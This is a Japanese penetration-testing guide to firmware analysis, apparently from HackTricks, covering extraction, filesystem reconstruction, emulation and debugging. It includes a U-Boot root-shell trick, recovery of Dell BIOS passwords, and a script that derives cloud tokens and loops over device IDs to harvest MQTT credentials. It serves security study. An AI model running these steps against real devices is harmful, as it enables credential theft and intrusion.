# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

公開されているハードウェアインターフェースから取得する方法については、[UARTコンソールを使ったファームウェアのダンプ](../hardware-hacking/uart.md#dumping-firmware-with-uart-console)および[SPI flashのダンプ](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介し、デバイスが正しく動作するために不可欠なソフトウェアです。永続メモリに保存されているため、デバイスの電源投入直後から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、ファームウェアの調査や変更の可能性を検討することは重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期ステップです。このプロセスでは、次のデータを収集します。

- CPUアーキテクチャと実行しているオペレーティングシステム
- ブートローダーの詳細
- ハードウェア構成とデータシート
- コードベースの規模とソースの場所
- 外部ライブラリとライセンスの種類
- 更新履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には**オープンソースインテリジェンス（OSINT）**ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動のレビューで分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールでは、潜在的な問題の発見に活用できる静的解析を無料で利用できます。

## **ファームウェアの取得**

ファームウェアは、難易度の異なるさまざまな方法で取得できます。

- 開発者やメーカーなどの提供元から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているファームウェアファイルを見つけるために**Google dork**クエリを使う
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使って**クラウドストレージ**に直接アクセスする
- 中間者攻撃の手法で**更新を傍受**する
- **UART**、**JTAG**、**PICit**などを介してデバイスから**抽出**する
- デバイス通信内の更新リクエストを**スニッフィング**する
- **ハードコードされた更新エンドポイント**を特定して利用する
- ブートローダーまたはネットワークから**ダンプ**する
- 他の方法がすべて失敗した場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTログのみの場合: フラッシュ内のU-Boot envを介してrootシェルを強制起動する

UART RXが無視され、ログしか取得できない場合でも、オフラインで**U-Boot環境ブロブを編集**すればinitシェルを強制起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、blobの**U-Boot env CRC32を再計算**します。
3. env partitionのみを再書き込みして再起動すると、UARTにshellが表示されます。

これは、bootloader shellが無効になっているものの、外部flashアクセスでenv partitionを書き込める組み込みデバイスで役立ちます。

## ファームウェアの分析

**ファームウェアを入手したら**、どのように扱うべきかを判断するため、情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。高ければ、暗号化されている可能性があります（または何らかの方法で圧縮されています）。

さらに、以下のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、ファイルの調査に[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))を使えます。

### 差分フラッシュ解析と復元可能なXORシークレットストア

ファームウェア設定の保存形式が文書化されていない場合は、まず一致するフラッシュ読み取りを複数回行い、設定を**1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較します。値を制御して実験を繰り返すことで、その設定の変更とカウンターや書き込みメタデータの変更を区別できます。データがその場で更新されず、新しいオフセットに変更が現れる場合は、追記専用またはログ構造型のストアであることを示しています。削除済みまたは tombstone 化されたエントリも保持してください。ペイロードのバイト列を復元できる可能性があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraで書き込み処理と検証処理をリバースエンジニアリングします。暗号文のパターンだけから方式を推測せず、コードでフィールド境界、パディング、キーのインデックス付け、鍵導出を確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロパディングから鍵を復元する

[ XORベースの暗号化](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文があると、同じオフセットのキーストリームバイトが明らかになります。固定サイズのフィールドでは、ゼロパディングが繰り返しXORキーのすべてのインデックスを覆う場合、特に脆弱です。`0x00 XOR key_byte = key_byte` なので、暗号化されたパディングからキーの各バイトが直接明らかになります。キーのすべてのインデックスが覆われていれば、暗号文の末尾からキーを復元し、値が格納された部分を復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOSパスワード形式が具体例です。32バイトのフィールドのうち、バイト`0`は平文で、バイト`1..31`には20バイトの繰り返しキーが使われます。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワード長が `L` の場合、XOR の前は位置 `L..31` がゼロでした。`L <= 12` なら、これらの位置がすべてのキーインデックスを網羅するため、ブルートフォースなしでキー全体とパスワードを復元できます:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去の記録から鍵を取得する

各レコードを個別に分析しないでください。DVAR key はおおよそ `modified_md5(device_seed || variable_GUID || password[0])` として導出されます。device seed と GUID は固定されており、password に依存する入力は平文の先頭バイトだけです。したがって、デバイスごとの鍵は最大 256 個で、同じバイトで始まるレコードは同じ鍵を共有します。アクティブなレコードと削除済みレコードをそのバイトごとにグループ化してください。短い過去のレコードは、padding を通じて完全な鍵を leak し、自身の padding だけでは不十分な、現在の長いレコードを復号できる場合があります。そのため、古い暗号文を消去せず tombstone 化すると、password rotation によってかえって露出が増すことがあります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool は DVAR を特定し、候補レコードを検証して password を復元し、保存されている raw/key bytes を表示できます。checkout から build し、検証済みの flash image を次のようにスキャンしてください。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、鍵のエントロピー、鍵が折り返す箇所での整合性を使って誤検出を排除します。繰り返し取得したダンプで書き込みごとのビット反転がまばらに見られる場合は、観測されたマスクを列挙し、これらの制約に基づいて補正候補に順位を付けます。ただし、ヒューリスティックな出力を完全な復元結果として示すのではなく、曖昧な文字はそのまま報告してください。<sup>[[12]](#references)</sup>

パスワード検証用データには、復号可能な暗号文ではなく、ソルト付きの反復一方向ハッシュを保存してください。また、ログ構造型ストアでは、置き換えられた秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

前述のコメント付きツールを使った `binwalk -ev <bin>` などのコマンドで、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、ファイルシステムの種類を名前とする**フォルダー**内に抽出します。一般的な種類は squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs です。

#### ファイルシステムの手動抽出

Binwalk のシグネチャにファイルシステムの**マジックバイトが含まれていない**場合があります。このような場合は、binwalk を使ってファイルシステムの**オフセットを見つけ、バイナリから圧縮ファイルシステムを切り出し**、以下の手順で種類に応じて**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

次の **dd command** を実行して、Squashfsファイルシステムを切り出します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリ内に展開されます。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込み root ファイルシステムの再構築

raw eMMC/SSD ダンプに有効なファイルシステムヘッダーが含まれているものの、メタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損していると判断しないでください。組み込みのブートコードは Device Mapper を使って複数の物理範囲から実際の root デバイスを構成することがあるため、GPT パーティションを1つだけ切り出すと、最初のセグメントしか取得できない場合があります。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得処理が完了していること、サイズが安定していること、イメージを保持している書き込みプロセスがないことを確認してください。ファイル名に開始アドレスと終了アドレスが含まれている場合は、その範囲を実際のバイト数と照合します。GPT を読み取り専用モードで復元し、必要な範囲だけをアタッチしてください。ワークステーション上で信頼できない物理ボリュームに対して `vgchange -ay` を実行**しないでください**。ボリュームグループの衝突や意図しない書き込みが発生する可能性があります。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックや LVM スタックがイメージ全体を必要とする場合は、使い捨て VM を使用してください。標準的な boot partition の過去の起動ログは特に役立ちます。bootloader が proprietary container のオフセット、各コンポーネントの長さ、slot の選択、アラインメント規則、署名検証を記録している場合があります。それらの値を使って、埋め込まれたコマンドライン、kernel、initramfs を切り出し、各出力を `file`、マジックバイト、`binwalk` で個別に検証してください。container の末尾まで読み込むと、initrd、ACPI object、署名が誤って kernel に追加されることがあります。<sup>[[9]](#references)</sup>

#### 起動時のブロックマップを復元する

kernel の initramfs を抽出し、`/init` とストレージライブラリをリバースしてください。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、partition のパスへの文字列参照をたどり、次に、アクティブな A/B slot を選択して table を構築するコードを追跡します。radare2 での調査開始に役立つコマンドは、`r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` です。<sup>[[9]](#references)</sup>

linear target は、仮想デバイスの連続した範囲を、1 つ以上の backing device の範囲にマッピングします。復元した 2 セグメントの table は、一般に次の形式です（位置と長さはすべて 512 バイトセクター単位）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

機械語の算術演算は、整数幅、シフト、単位変換を含めて正確に再現してください。たとえば、次の式はバイトサイズを4-KiB境界に切り下げてから512-byteセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

GPT-derived offsets、反転したセクタ数、出力される長さは、それぞれ別々にアサーションで検証してください。メディアダンプ全体をメモリに読み込まず、テーブルの順序に従って範囲を上限付きのチャンクでコピーし、フラットな解析イメージを再構築します。これにより、ホスト側でmapperデバイスを作成することも避けられます。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築誤差を区別する

SquashFSでは、`unsquashfs`を実行する前に、`hsqs`マジックを確認し、スーパーブロックのオフセット40にあるリトルエンディアンの64ビット`bytes_used`フィールドをデコードしてください。複数の無関係な構造で展開に失敗する場合は、予想位置の前後に広い範囲を設定して検索し、強い構造的根拠のある候補を要求してください。たとえば、展開可能なmetadataブロック、有効なディレクトリエントリが連続して複数あること、妥当なinodeフィールド、inode数と整合するroot inode、有効なintegrity-metadata構造などです。マジックが1つ一致するだけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付き差分によって独立した構造（たとえば、ディレクトリのメタデータとverityレコード）が有効になる場合、バイトの欠落ではなく、セグメント開始位置の系統的なずれが原因である可能性が高いです。孤立データの復旧やファイルシステムのメタデータのパッチを試みる前に、逆算に戻り、破棄された余り、符号の扱い、オーバーフロー、セクター／ページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護の境界を分けて考えてください。TPMで封印されたLUKSボリュームはデータの機密性を保護し、署名付きのdm-verityマッピングはルートファイルシステムの完全性を保護します。ソフトウェアTPMでは、元の物理TPMに封印されたキーを復元できません。また、verity検証を省略する調査専用のinitを使って改変済みのSquashFSを起動しても、署名を偽造したことにも、dm-verityを破ったことにもなりません。<sup>[[9]](#references)</sup>

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために、詳細に解析することが不可欠です。このプロセスでは、さまざまなツールを使ってファームウェアイメージを解析し、有用なデータを抽出します。

### 初期解析ツール

バイナリファイル（`<bin>`と表記）を初期調査するためのコマンドを紹介します。これらのコマンドを使うと、ファイル形式の特定、文字列の抽出、バイナリデータの解析、パーティションやファイルシステムの詳細の把握ができます：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状況を評価するには、`binwalk -E <bin>` で**entropy**を確認します。entropyが低い場合は暗号化されていない可能性が高く、entropyが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools**のドキュメントや、ファイル検査用の**binvis.io**などのツールやリソースが推奨されます。

### Filesystemの抽出

`binwalk -ev <bin>`を使うと、通常はfilesystemを抽出できます。抽出先は多くの場合、filesystemの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）になります。ただし、magic bytesが欠落しているために**binwalk**がfilesystemの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk`でfilesystemのoffsetを特定し、続いて`dd`コマンドでfilesystemを切り出します:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で展開するためのコマンドが異なります。

### ファイルシステムの分析

ファイルシステムを展開したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、API endpoint、アップデートサーバーの機能、コンパイルされていないコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

確認すべき**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報を含む **etc/shadow** と **etc/passwd**
- **etc/ssl** 内のSSL証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析が必要な組み込みバイナリ
- 一般的なIoTデバイスのWebサーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。

- 機密情報の検索に使用する [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- ファームウェアを包括的に分析する [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析に使用する [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内にあるソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unixバイナリ用の **checksec.sh** やWindowsバイナリ用の **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## 派生URLトークンを使ったcloud設定とMQTT認証情報の取得

多くのIoTハブは、次のようなcloud endpointからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析では、たとえば次のように、`<token>` がハードコードされたシークレットを使ってデバイスIDからローカルで導出されていることがわかる場合があります。

- token = MD5( deviceId || STATIC_KEY )。大文字の16進数として表現される

この設計では、deviceIdとSTATIC_KEYを知っている人なら誰でもURLを再構築してcloud設定を取得でき、多くの場合、平文のMQTT認証情報やtopic prefixが明らかになります。

実践的な手順:

1) UARTの起動ログからdeviceIdを抽出する

- 3.3VのUARTアダプター（TX/RX/GND）を接続し、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- クラウド設定URLのパターンとブローカーアドレスを出力する行を探します。例：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtokenアルゴリズムを復元する

- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bashでtokenを導出し、digestを大文字にする。

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を取得する

- URLを組み立て、curlでJSONを取得し、jqで解析して秘密情報を抽出します:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL（存在する場合）を悪用する

- 復元した認証情報を使ってメンテナンス topic を subscribe し、機密性の高いイベントを探します。

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイスIDを列挙する（大規模に、許可を得たうえで）

- 多くのエコシステムでは、ベンダーのOUI／製品／タイプを示すバイト列の後に、連番のサフィックスが続く形式が使われています。
- 候補IDを順に試し、トークンを導出して、プログラムから設定を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、ターゲットハードウェアを変更せずに秘密情報を復元できるよう、エミュレーションまたは静的解析を優先してください。

ファームウェアをエミュレートすることで、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となることがありますが、Raspberry Piなど、アーキテクチャとエンディアンが一致するデバイスや、事前に構築された仮想マシンにルートファイルシステムまたは特定のバイナリを転送すると、さらなるテストを実施できます。

### 個々のバイナリのエミュレーション

単一のプログラムを調査する場合は、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用します。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARMアーキテクチャのエミュレーション

ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### フルシステムエミュレーション

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションを自動化でき、動的解析にも役立ちます。

### エミュレーション用に分割された検証済みルートファイルシステムを再構築する

SquashFSのスーパーブロックは読み取れるものの、inode、ディレクトリ、またはフラグメントテーブルのオフセットがあり得ない値になっている場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこから作成されるブロックデバイスの構成を再現してください。組み込みシステムでは、名目上のルートパーティションが公開されていても、別のパーティションから借りたセクターを追加する `dm-linear` マッピングによって、実際のファイルシステムが構築されることがあります。スーパーブロックだけの検査は成功しても、その後のメタデータブロックがすべてずれている場合があります。<sup>[[11]](#references)</sup>

ファームウェアの算術処理は正確に再現してください。特に、長さの単位がバイト、512バイトセクター、4 KiBページのいずれなのかを特定し、シフトと切り捨てを元の順序で再現するとともに、A/Bレイアウトにおけるバンクごとの末尾領域も考慮してください。たとえば、`(partition_bytes >> 12) << 3` は、まず4 KiB境界で切り捨ててから、その結果を512バイトセクター単位で表します。これを `partition_bytes // 512` に置き換えると、追加領域の位置が数キロバイトずれ、後続のSquashFSテーブルがすべて破損する可能性があります。<sup>[[11]](#references)</sup>

次の検証手順が有効です。<sup>[[11]](#references)</sup>

1. 検証/initバイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを特定します。
2. アラインメントの扱いを変えずに、各領域を連結するかマッピングします。
3. それでも抽出に失敗する場合は、予測される境界の周辺に限定して小さな範囲を検索し、もっともらしいスーパーブロックだけを根拠にせず、連続する複数の有効なメタデータ構造があることを確認します。
4. 再構築したイメージに変更していない `unsquashfs` を実行します。すべてのディレクトリとフラグメントを正常に走査できることは、`unsquashfs -stat` の結果より強い証拠になります。

#### 解析者が制御するdm-verityの置き換え

解析者がQEMUカーネル、initramfs、仮想ディスクを制御できる場合、ベンダーの検証用PID 1を小さな静的リンク済みinitに置き換えることで、改変したルートを起動できます。これは**ラボ環境でのブートチェーン置換**であり、dm-verity、そのRSA署名、Secure Boot、TPMで封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換え用initは、元のブート手順における実運用上の処理を再現してください。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプター0～2に接続し、`/proc` と `/sys` をマウントし、指定されたブロックデバイスが利用可能になるまで待ち、編集済みルートを読み取り専用でマウントします。その後、古いルートの疑似ファイルシステムを切り離し、新しいマウントを `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` で実行します。`MS_MOVE` の**前に** `/dev`、`/proc`、`/sys` を切り離すことで、新しいルートに属するマウントポイントを誤って切り離すのを防げます。<sup>[[11]](#references)</sup>

変更可能なデバイス状態は、改変した不変ルートとは分離してください。qcow2オーバーレイで元のディスクのLVM状態を保持し、2台目の読み取り専用virtioディスクで編集済みSquashFSを提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動の遅延、破壊的な起動スクリプト、または不安定なコンソールログによって障害の原因がわかりにくい場合は、ゲストの外部にある永続状態を調べます。実行中のVMが使用しているoverlayは決してアタッチしないでください。`qemu-nbd`で公開し、LVMの検出対象を意図したNBDパーティションに限定してから、切断する前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現性のある障害切り分けのため、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで確認してください。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了によって誤検知が発生することがあります。また、無関係なコードを変更する前に、各レイヤーのインターフェースが正確に一致するか比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI ドライバー ABI、PCI 情報から導かれるドライバー名を確認します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使えないことがあります。<sup>[[11]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を使用して解析します。OS とファイルシステムへのシェルアクセスを維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があり、そのためエミュレーションを再起動しなければならないことがあります。ファイルシステムを再確認し、公開されている Web ページやネットワークサービスを悪用し、ブートローダーの脆弱性を調査します。バックドアの脆弱性の可能性を特定するには、ファームウェアの整合性テストが重要です。

## 実行時解析手法

実行時解析では、gdb-multiarch、Frida、Ghidra などのツールを使い、プロセスやバイナリが動作する環境内で操作します。ブレークポイントの設定や、fuzzing などの手法による脆弱性の特定を行います。

完全なデバッガーがない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピーし、リモートで接続してください**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF stack が **radio MCU** と Linux userland process に分割されていることがよくあります。次の経路をマッピングするのが有効です:<sup>[[8]](#references)</sup>

1. 空中の **RF frame**
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。controller がバイナリの radio frame を `Group,Command,arg1,arg2,...` のようなテキスト protocol に変換する場合は、次の項目を特定します。

- **message group** と dispatch table
- どのメッセージが **network** 由来で、どれが controller 自体に由来するか
- 正確な **manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` とカスタム `cluster_command`）
- **commissioning**、discovery、または firmware/model download の段階でのみ到達可能な handler

Zigbee では、ペアリング時の通信をキャプチャし、対象がデフォルトの **Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning 時の通信を sniff すると **Network Key** が露出する可能性があります。Zigbee 3.0 の install code はこのリスクを軽減するため、テスト対象のデバイスが実際にそれらを強制しているか確認してください。

### Manufacturer-specific protocol handler と FSM で制限される到達可能性

Vendor-specific Zigbee/ZCL command は、標準化された cluster よりも有力なターゲットになることがよくあります。**custom parsing code** や、十分な検証実績のない内部 **FSM** に処理が渡されるためです。<sup>[[8]](#references)</sup>

実践的な手順:

- command dispatcher を解析し、**vendor-only handler** を特定します。
- **FSM state**、**event**、**check**、**action**、**next-state** の table を復元します。
- 自動的に次へ進む **transitional state** と、最終的に attacker-controlled state を reset または free する retry/error branch を特定します。
- buggy handler が常に到達可能だと決めつけず、脆弱な状態に daemon を移行させるために必要な正規の protocol exchange を確認します。

タイミングに依存する protocol では、Python framework からの packet replay は遅すぎる場合があります。より確実な方法は、vendor-grade stack を使い、実機ハードウェア（例: **nRF52840**）上で正規のデバイスをエミュレートして、正しい **endpoint**、**attribute**、commissioning timing を再現することです。

### Embedded daemon における fragmented-download bug class

**fragmented blob/model/configuration download** では、繰り返し見られる firmware bug class があります:<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を実行します。
2. それ以降の fragment では、`packet_total_size >= offset + chunk_len` など、攻撃者が制御する **packet-local** field だけを検証します。
